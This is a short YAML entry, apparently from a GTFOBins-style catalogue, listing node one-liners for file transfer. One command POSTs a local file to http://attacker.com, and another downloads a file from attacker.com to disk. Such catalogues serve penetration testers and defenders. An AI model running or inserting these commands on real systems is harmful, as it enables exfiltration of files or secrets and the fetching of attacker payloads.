---
functions:
  file-upload:
    - description: Send a local file via HTTP POST request.
      code: |
        export URL=http://attacker.com
        export LFILE=file_to_send
        node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
---
